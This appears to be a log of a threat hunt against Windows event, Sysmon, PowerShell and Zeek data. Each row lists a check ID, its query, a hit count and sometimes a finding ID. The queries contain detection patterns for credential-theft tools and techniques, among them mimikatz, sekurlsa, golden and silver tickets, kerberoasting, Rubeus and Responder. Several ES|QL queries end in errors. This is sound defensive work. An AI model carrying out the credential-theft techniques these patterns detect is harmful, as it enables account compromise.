| q-0b389d7615 | check C173 | search | {"dataset": "windows.other", "query": "*vault* OR *credential* OR *cmdkey*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "s… | 2 |  |
| q-36b6180bde | check C174 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*keepass* OR process.command_line:*1password* OR process.command_line:*lastpass* OR process.command_line:*bitwarden* OR process.command_line:*password… | 0 |  |
| q-80bfdc8645 | check C175 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*keepass* OR win.TargetImage:*1password* OR win.TargetImage:*lastpass* OR win.TargetImage:*bitwarden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "obser… | 0 |  |
| q-eafbdffa15 | check C176 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*keepass* OR process.command_line:*1password* OR process.command_line:*lastpass* OR process.command_line:*bitwarden*)", "time_from": null, "time_… | 0 |  |
| q-9eb1cef0dc | check C177 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*keepass* OR win.ScriptBlockText:*1password* OR win.ScriptBlockText:*lastpass* OR win.ScriptBlockText:*bitwarden* OR win.ScriptBlockText:*.kdbx*)", "time_from": null, "time_to… | 0 |  |
| q-aab374c063 | check C178 | search | {"dataset": "windows.other", "query": "*keepass* OR *1password* OR *lastpass* OR *bitwarden* OR *kdbx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable"… | 0 |  |
| q-1a8a418baf | check C179 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*sam* OR win.TargetImage:*cryptdll* OR win.TargetImage:*msv1_0* OR win.TargetImage:*kerberos*)", "time_from": null, "time_to": nul… | 326 |  |
| q-bc9322ac9c | check C180 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*msv1_0* OR win.ImageLoaded:*kerberos* OR win.ImageLoaded:*lsass*)", "time_from": null, "time_to": null, "size": 50, "sub_field"… | 54 |  |
| q-a2e6e7cb75 | check C181 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Control\\\\Lsa* OR registry.path:*SecurityProviders* OR registry.path:*Notification Packages*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name"… | 293 |  |
| q-0ace5cbbbc | check C182 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*Lsa* OR win.ObjectName:*SecurityProviders* OR win.ObjectName:*Notification* OR win.ObjectName:*SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "obs… | 0 |  |
| q-d620ad66da | check C183 | search | {"dataset": "windows.other", "query": "*lsass* OR *cryptdll* OR *SecurityProviders* OR *Notification Packages*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 4 |  |
| q-f169a4d4a2 | check C184 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*cryptdll* OR win.ScriptBlockText:*SecurityProviders* OR win.ScriptBlockText:*Notification*Packages*)", "time_from": null, "time_to": null, "fie… | 0 |  |
| q-f425de0a3a | check C185 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*cryptdll*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-b3ad6fc8e0 | check C186 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*lsass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 33 |  |
| q-6a04d601cb | check C187 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-e4698fc64d | check C188 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 | F39 |
| q-605376d982 | check C189 | search | {"dataset": "windows.other", "query": "*lsass* OR *cryptdll* OR *Unexpected modification*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.co… | 0 |  |
| q-fbcc1b4ede | check C190 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*cryptdll* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-a1428b7951 | check C191 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*cryptdll* OR win.TargetFilename:*\\\\Lsa\\\\* OR win.TargetFilename:*password*filter* OR win.TargetFilename:*.dll) AND (win.TargetFilename:*System32* OR win.TargetFilename:*SysWOW64… | 0 |  |
| q-5acbe3d52e | check C192 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Notification*Packages* OR registry.path:*Control\\\\Lsa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "use… | 3 |  |
| q-0ecfc38807 | check C193 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*cryptdll* OR win.ImageLoaded:*lsass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 33 |  |
| q-26d2f7392a | check C194 | search | {"dataset": "windows.security", "query": "event.code:4657 AND (win.ObjectName:*Notification* OR win.ObjectName:*Lsa* OR win.ObjectName:*SecurityProviders*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.data… | 0 |  |
| q-dea14a8fcf | check C195 | search | {"dataset": "windows.other", "query": "*Notification Packages* OR *password filter* OR *cryptdll*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pr… | 5 |  |
| q-960eb0e972 | check C196 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Notification*Packages* OR win.ScriptBlockText:*password*filter* OR win.ScriptBlockText:*cryptdll*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name",… | 0 |  |
| q-c146b1edf6 | check C197 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*AllowReversiblePasswordEncryption* OR win.ScriptBlockText:*ReversibleEncryption* OR win.ScriptBlockText:*Set-ADAccountControl* OR win.ScriptBlockText:*Set-ADUser*)", "time_fr… | 1 |  |
| q-01ec3410cb | check C198 | search | {"dataset": "windows.powershell", "query": "event.code:4103 AND (win.Payload:*Reversible* OR win.Payload:*Set-ADAccountControl* OR win.Payload:*Set-ADUser*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-c4eeb518e3 | check C199 | search | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 0 |  |
| q-776d70fac3 | check C200 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*Reversible* OR process.command_line:*Set-ADAccountControl* OR process.command_line:*Set-ADUser* OR process.command_line:*dsmod*)", "time_from": null,… | 0 |  |
| q-af237fd3f4 | check C201 | search | {"dataset": "windows.other", "query": "*Reversible* OR *4739* OR *Set-ADAccountControl*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-1724cee2ca | check C202 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthentication*\" OR TO_L… | ERROR |  |
| q-333985a247 | check C202 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*set-aduser*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*set-adauthenticationpolicy*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*strongauthentication*\" OR TO_L… | ERROR |  |
| q-2f86b3a4e5 | check C203 | count | {"dataset": "windows.security", "query": "event.code:4739", "time_from": null, "time_to": null} | 0 |  |
| q-66bdc1e449 | check C204 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:5136", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-913138068f | check C205 | search | {"dataset": "windows.other", "query": "event.code:4739 OR event.code:5136 OR event.code:4738", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-88dfcf95e6 | check C206 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*ADUser* OR process.command_line:*ADAuthenticationPolicy* OR process.command_line:*dsacls* OR process.command_line:*ntdsutil*)", "time_from": null, "t… | 0 |  |
| q-1a4a0a30be | check C207 | count | {"dataset": "windows.security", "query": "event.code:5136", "time_from": null, "time_to": null} | 0 |  |
| q-8eaa526d05 | check C208 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 AND win.LogonType:3", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 218 |  |
| q-49c6454fc0 | check C209 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 20259 |  |
| q-5f4b144c42 | check C210 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*aadconnect*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlock… | ERROR |  |
| q-108c237627 | check C210 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*azuread*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*aadconnect*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*connect-msolservice*\" OR TO_LOWER(win.ScriptBlock… | ERROR |  |
| q-3b15f7ce78 | check C211 | search | {"dataset": "windows.other", "query": "event.code:5136 OR event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 5 |  |
| q-ff1e5583ad | check C212 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetObject", "query": "event.code:13 AND registry.path:*NetworkProvider*", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-8ff31a9de0 | check C213 | aggregate | {"dataset": "windows.sysmon", "field": "win.Image", "query": "event.code:11 AND (file.path:*NetworkProvider* OR file.path:*System32*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 425 |  |
| q-6228d2c713 | check C214 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-0810600fa4 | check C215 | count | {"dataset": "windows.security", "query": "event.code:4657 AND win.ObjectName:*NetworkProvider*", "time_from": null, "time_to": null} | 0 |  |
| q-759b2461bc | check C216 | search | {"dataset": "windows.other", "query": "event.code:4657 OR event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 5 |  |
| q-6ee19ac967 | check C217 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*hklm*networkprovider*\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _inde… | ERROR |  |
| q-262356f1b2 | check C217 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*networkprovider*\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockText, _id, _index"} | ERROR |  |
| q-0c221c45cc | check C218 | aggregate | {"dataset": "windows.sysmon", "field": "win.DestinationHostname", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-9d25f3b8b7 | check C219 | aggregate | {"dataset": "windows.sysmon", "field": "destination.ip", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-17144621e5 | check C220 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-e4b2fcd554 | check C221 | search | {"dataset": "windows.other", "query": "event.code:4663 OR event.code:4670 OR event.code:4656", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-2fcc0baef0 | check C222 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*inveigh*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*a… | ERROR |  |
| q-4ae94044f3 | check C222 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*inveigh*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*llmnr*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*a… | ERROR |  |
| q-b182502c30 | check C223 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-84b1861c74 | check C224 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-7998625401 | check C225 | aggregate | {"dataset": "windows.sysmon", "field": "destination.ip", "query": "event.code:3 AND (destination.port:445 OR destination.port:139)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 66 |  |
| q-018f0dffd9 | check C226 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 AND win.LogonType:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 218 |  |
| q-afeca146cb | check C227 | count | {"dataset": "windows.security", "query": "event.code:4697", "time_from": null, "time_to": null} | 23 |  |
| q-5923671c10 | check C228 | search | {"dataset": "windows.other", "query": "event.code:4697 OR event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 5 | F42 |
| q-3594578471 | check C229 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*enablemulticast*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*dnsclient*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockTex… | ERROR |  |
| q-b857e87e21 | check C229 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*enablemulticast*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*dnsclient*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*responder*\" OR TO_LOWER(win.ScriptBlockTex… | ERROR |  |
| q-f729675919 | check C230 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-add6b93f38 | check C231 | aggregate | {"dataset": "windows.sysmon", "field": "destination.ip", "query": "event.code:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1229 |  |
| q-839c2e620d | check C232 | aggregate | {"dataset": "windows.sysmon", "field": "win.QueryName", "query": "event.code:22", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 81 |  |
| q-196b20df23 | check C233 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 AND win.LogonType:3", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 218 |  |
| q-8b85761373 | check C234 | search | {"dataset": "windows.other", "query": "event.code:5156 OR event.code:5157", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 0 |  |
| q-7ac9f6774d | check C235 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*spoof*\" \| KEEP @timestamp, host.name, user.name… | ERROR |  |
| q-c8ba2346a3 | check C235 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*spoof*\" \| KEEP @timestamp, host.name, user.name… | ERROR |  |
| q-c0c5bbd011 | check C236 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-6f9e6d86a5 | check C237 | search | {"dataset": "windows.other", "query": "event.code:(1341 OR 1342 OR 1020 OR 1063)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-3a49badfff | check C238 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-92db64b199 | check C239 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*dhcp* OR process.command_line:*ipconfig* OR process.command_line:*netsh*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 5 |  |
| q-094a386265 | check C240 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*dhcp* OR *DhcpServer* OR *New-DhcpServer* OR *Add-DhcpServerv4Option*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code",… | 0 |  |
| q-a82d843909 | check C241 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn AND (destination.port:67 OR destination.port:68)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-7d135aa1ae | check C242 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-595b6b4843 | check C243 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4634", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 236 |  |
| q-d2af1c45dd | check C244 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-ae4c152ab6 | check C245 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 88 |  |
| q-83a099bf25 | check C246 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*kerberos* OR *ticket* OR *kirbi* OR *Rubeus* OR *Mimikatz*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name… | 0 |  |
| q-26d4f9729d | check C247 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-fb43fcfd37 | check C248 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-99bd0e9718 | check C249 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4634", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 236 |  |
| q-e123ddc42a | check C250 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-58349e19c8 | check C251 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 88 |  |
| q-68a84369c9 | check C252 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*krbtgt* OR *golden* OR *Mimikatz* OR *kerberos::golden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", … | ERROR |  |
| q-a92525554b | check C252 (repaired) | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*krbtgt* OR *golden* OR *Mimikatz* OR *kerberos\\:\\:golden*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 0 |  |
| q-9ee354bda8 | check C253 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-9b1f795747 | check C254 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-270eab6026 | check C255 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4634", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 236 |  |
| q-bbbf491a3c | check C256 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-99c541a1f2 | check C257 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 88 |  |
| q-9d559fcccc | check C258 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*silver* OR *kerberos::silver* OR *Mimikatz* OR *service ticket*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user… | ERROR |  |
| q-5e462792cc | check C258 (repaired) | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*silver* OR *Mimikatz* OR *service ticket*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.execu… | 0 |  |
| q-0b0392c92f | check C259 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-3445ece1b2 | check C260 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-9c3a76abb7 | check C261 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-10c2c52a61 | check C262 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-a8fe70d57e | check C263 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 88 |  |
| q-aa72923ec1 | check C264 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*kerberoast* OR *Invoke-Kerberoast* OR *GetUserSPNs* OR *SPN*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.na… | 0 |  |
| q-75b9b5ad19 | check C265 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-9a2c3dbefb | check C266 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 297 |  |
| q-16e5aebf7c | check C267 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*asreproast* OR process.command_line:*GetNPUsers* OR process.command_line:*Rubeus*)", "time_from": null, "time_to": null, "size": 50, "sub_field": nul… | 0 |  |
| q-c879e963df | check C268 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sou… | 88 |  |
| q-5ef58c8bde | check C269 | search | {"dataset": "windows.powershell", "query": "win.ScriptBlockText:(*asreproast* OR *GetNPUsers* OR *Rubeus* OR *preauth*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-831cebb486 | check C270 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-57a59862d7 | check C271 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-8aaf36b390 | check C272 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 15 |  |
| q-51b1472c32 | check C273 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 39283 |  |
| q-b7e9935711 | check C274 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 1649 |  |
| q-3041d04807 | check C275 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-577232f942 | check C276 | aggregate | {"dataset": "windows.security", "field": "win.AuthenticationPackageName", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-a7ec91d608 | check C277 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 15 |  |
| q-cd52143176 | check C278 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 0 |  |
| q-e42fe46ecf | check C279 | aggregate | {"dataset": "windows.security", "field": "win.IpAddress", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 0 |  |
| q-9d254ca787 | check C280 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4657", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 36 |  |
| q-ad5dd41348 | check C281 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 14 |  |
| q-00edc12071 | check C282 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 1649 |  |
| q-936068e9e5 | triage T1003 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND process.executable:*PowerShell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.executable", "process.command_line", "win.Ta… | 4 | F01 |
| q-a08440984f | triage T1003 step 1 | search | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "win.ObjectName", "win.Properties", "win.AccessMask", "win.SubjectUserName", "win.SubjectDomainName", "win.Object… | 7 | F04 |
